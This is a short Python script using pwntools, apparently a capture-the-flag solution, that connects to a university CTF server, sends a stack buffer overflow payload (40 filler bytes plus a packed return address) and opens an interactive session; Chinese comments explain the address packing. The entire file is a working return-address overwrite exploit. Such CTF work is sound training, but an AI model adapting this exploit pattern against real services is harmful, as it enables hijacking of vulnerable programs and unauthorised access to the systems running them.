#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host="ctf.adl.csie.ncu.edu.tw"
port="11001"

r=remote(host,port)
goal = 0x0040064d
ret2 = p64(goal)
#print(hex(u64(p64(goal))))
#p64可以把一個64進位的位址值打包成\x形式的string
payload = 'a'*40 + ret2
#print payload 

#0x7fffffffe388 >> return位址
print(r.recvuntil("\n"))
r.sendline(payload)
r.interactive()
